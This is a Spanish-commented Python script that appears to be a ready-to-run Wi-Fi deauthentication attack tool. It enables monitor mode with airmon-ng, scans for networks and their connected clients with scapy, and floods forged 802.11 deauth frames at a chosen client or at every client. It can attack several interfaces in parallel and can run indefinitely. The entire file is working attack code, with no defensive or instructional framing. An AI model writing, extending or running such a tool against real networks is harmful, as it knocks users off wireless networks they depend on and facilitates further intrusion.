
import subprocess
import sys
import threading
import time

# --- Instalación automática de dependencias Python ---
def instalar_paquete(paquete):
    print(f"[+] Instalando {paquete}...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", paquete])

# Verificar módulos
try:
    import scapy.all as scapy
except ImportError:
    instalar_paquete("scapy")
    import scapy.all as scapy

try:
    import questionary
except ImportError:
    instalar_paquete("questionary")
    import questionary

try:
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
except ImportError:
    instalar_paquete("rich")
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn

from scapy.all import sniff, Dot11, Dot11Beacon, RadioTap, Dot11Deauth, sendp

# --- Verificar comandos de sistema ---
def comando_existe(comando):
    return subprocess.call(f"type {comando}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0

if not comando_existe("airmon-ng"):
    print("[!] 'airmon-ng' no está instalado o no está en PATH. Por favor instálalo manualmente.")

if not comando_existe("iw"):
    print("[!] 'iw' no está instalado o no está en PATH. Por favor instálalo manualmente.")

# --- Funciones para manejo de interfaces ---
def get_wifi_interfaces():
    try:
        result = subprocess.check_output("iw dev", shell=True).decode()
        return [line.split()[-1] for line in result.split('\n') if "Interface" in line]
    except subprocess.CalledProcessError:
        return []

def enable_monitor_mode(interfaces):
    monitor_ifaces = []
    print("[*] Matando procesos que puedan interferir (airmon-ng check kill)...")
    subprocess.run("airmon-ng check kill", shell=True)
    for iface in interfaces:
        print(f"[*] Activando modo monitor en {iface}...")
        subprocess.run(f"airmon-ng start {iface}", shell=True)
        monitor_ifaces.append(iface + "mon")
    return monitor_ifaces

def seleccionar_interfaces():
    interfaces = get_wifi_interfaces()
    if not interfaces:
        print("[!] No se detectaron interfaces Wi-Fi.")
        sys.exit(1)

    return questionary.checkbox(
        "Selecciona las interfaces Wi-Fi que deseas usar:",
        choices=interfaces
    ).ask()

# --- Escaneo de redes ---
def escanear_redes_por_interfaz(iface, duracion=10):
    redes = {}

    def capturar(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            ssid = pkt[Dot11].info.decode(errors="ignore")
            if bssid not in redes:
                redes[bssid] = ssid

    print(f"\n[🔍] Escaneando redes con {iface} durante {duracion} segundos...")
    sniff(iface=iface, prn=capturar, timeout=duracion, monitor=True)
    return redes

# --- Asignar redes por interfaz ---
def asignar_redes_a_interfaces(mon_interfaces, duracion_escaneo=10):
    asignaciones = {}

    for iface in mon_interfaces:
        redes_detectadas = escanear_redes_por_interfaz(iface, duracion=duracion_escaneo)

        if not redes_detectadas:
            print(f"[!] No se detectaron redes con {iface}")
            continue

        opciones = [f"{ssid or '<oculta>'} ({bssid})" for bssid, ssid in redes_detectadas.items()]

        seleccion = questionary.select(
            f"Selecciona la red a atacar con {iface}:",
            choices=opciones
        ).ask()

        for bssid, ssid in redes_detectadas.items():
            texto = f"{ssid or '<oculta>'} ({bssid})"
            if seleccion == texto:
                asignaciones[iface] = {'bssid': bssid, 'ssid': ssid or "<oculta>"}
                break

    return asignaciones

# --- Escaneo clientes ---
def escanear_clientes(bssid_objetivo, iface, duracion=10):
    clientes = set()

    def capturar(pkt):
        if pkt.haslayer(Dot11):
            if pkt.type == 2:
                addr1 = pkt.addr1
                addr2 = pkt.addr2
                if bssid_objetivo in [addr1, addr2]:
                    cliente = addr2 if addr1 == bssid_objetivo else addr1
                    if cliente and cliente != "ff:ff:ff:ff:ff:ff":
                        clientes.add(cliente)

    print(f"\n[📱] Escaneando clientes conectados a {bssid_objetivo} usando {iface}...")
    sniff(iface=iface, prn=capturar, timeout=duracion)
    return list(clientes)

# --- Selección de cliente ---
def seleccionar_clientes_por_interfaz(asignaciones, duracion_escaneo=15):
    decisiones = {}

    for iface, info in asignaciones.items():
        bssid = info['bssid']
        ssid = info['ssid']
        clientes = escanear_clientes(bssid, iface, duracion=duracion_escaneo)

        if not clientes:
            usar_broadcast = questionary.confirm(
                f"No se encontraron clientes en {ssid}. ¿Desautenticar a todos igualmente?"
            ).ask()
            if usar_broadcast:
                decisiones[iface] = {'bssid': bssid, 'cliente': None}
        else:
            opciones = ["[Todos los clientes]"] + clientes
            seleccion = questionary.select(
                f"¿A qué cliente deseas atacar en {ssid} ({iface})?",
                choices=opciones
            ).ask()
            decisiones[iface] = {
                'bssid': bssid,
                'cliente': None if seleccion == "[Todos los clientes]" else seleccion
            }

    return decisiones

# --- Ataque de deauth con barra de progreso ---
def enviar_deauth_packets_con_progreso(iface, bssid, cliente, num_paquetes=None):
    print(f"[🚀] Iniciando ataque en {iface} contra {cliente or 'todos'} en {bssid}...")

    if cliente:
        dst = cliente
        src = bssid
    else:
        dst = "ff:ff:ff:ff:ff:ff"
        src = bssid

    pkt = RadioTap() / Dot11(addr1=dst, addr2=src, addr3=bssid) / Dot11Deauth(reason=7)

    with Progress(
        SpinnerColumn(),
        "[progress.description]{task.description}",
        BarColumn(),
        "[progress.percentage]{task.percentage:>3.0f}%",
        "•",
        TextColumn("[green]{task.completed} paquetes enviados"),
        TimeElapsedColumn(),
    ) as progress:

        tarea = progress.add_task(f"Atacando {iface}", total=num_paquetes or 0)

        try:
            if num_paquetes is None:
                while True:
                    sendp(pkt, iface=iface, count=5, inter=0.1, verbose=False)
                    progress.update(tarea, advance=5)
            else:
                total_enviado = 0
                while total_enviado < num_paquetes:
                    sendp(pkt, iface=iface, count=1, inter=0.1, verbose=False)
                    total_enviado += 1
                    progress.update(tarea, advance=1)
        except KeyboardInterrupt:
            print(f"\n[!] Ataque detenido en {iface}.")

    print(f"[✓] Ataque finalizado en {iface}")

# --- Lanzar ataques ---
def lanzar_ataques_en_paralelo(decisiones):
    infinito = questionary.confirm("¿Deseas que el ataque sea infinito?").ask()
    num_paquetes = None
    if not infinito:
        num_paquetes = questionary.text("¿Cuántos paquetes deseas enviar por interfaz?", default="100").ask()
        try:
            num_paquetes = int(num_paquetes)
        except ValueError:
            print("[!] Número inválido. Se enviarán 100 paquetes por defecto.")
            num_paquetes = 100

    hilos = []

    for iface, info in decisiones.items():
        hilo = threading.Thread(
            target=enviar_deauth_packets_con_progreso,
            args=(iface, info['bssid'], info['cliente'], num_paquetes)
        )
        hilo.daemon = True
        hilos.append(hilo)
        hilo.start()

    print("\n[🔥] Ataques lanzados en paralelo. Presiona Ctrl+C para detener si son infinitos.")

    for hilo in hilos:
        hilo.join()

# --- Menú principal ---
def menu_principal():
    modo = questionary.select(
        "Selecciona el modo de operación:",
        choices=[
            "🔘 Modo Semi-Automático",
            "⚙️ Modo Automático (en desarrollo)",
            "🎯 Atacar red específica (en desarrollo)",
            "🧪 Solo escanear redes/clientes (modo test)",
            "❌ Salir"
        ]
    ).ask()
    return modo

# --- Modo escanear solo ---
def modo_escanear():
    seleccionadas = seleccionar_interfaces()
    mon_interfaces = enable_monitor_mode(seleccionadas)
    for iface in mon_interfaces:
        redes = escanear_redes_por_interfaz(iface)
        print(f"\nRedes detectadas con {iface}:")
        for bssid, ssid in redes.items():
            print(f" - {ssid or '<oculta>'} ({bssid})")

# --- MAIN ---
if __name__ == "__main__":
    while True:
        modo = menu_principal()

        if "Semi" in modo:
            seleccionadas = seleccionar_interfaces()
            mon_interfaces = enable_monitor_mode(seleccionadas)

            asignaciones = asignar_redes_a_interfaces(mon_interfaces)
            if not asignaciones:
                print("[!] No se asignaron redes. Volviendo al menú principal.")
                continue

            decisiones = seleccionar_clientes_por_interfaz(asignaciones)
            if not decisiones:
                print("[!] No se seleccionaron objetivos. Volviendo al menú principal.")
                continue

            lanzar_ataques_en_paralelo(decisiones)

        elif "Automático" in modo:
            print("[⚙️] Modo automático en desarrollo...")

        elif "manual" in modo:
            print("[🎯] Modo manual en desarrollo...")

        elif "escanear" in modo:
            modo_escanear()

        elif "Salir" in modo:
            print("👋 Hasta luego.")
            break
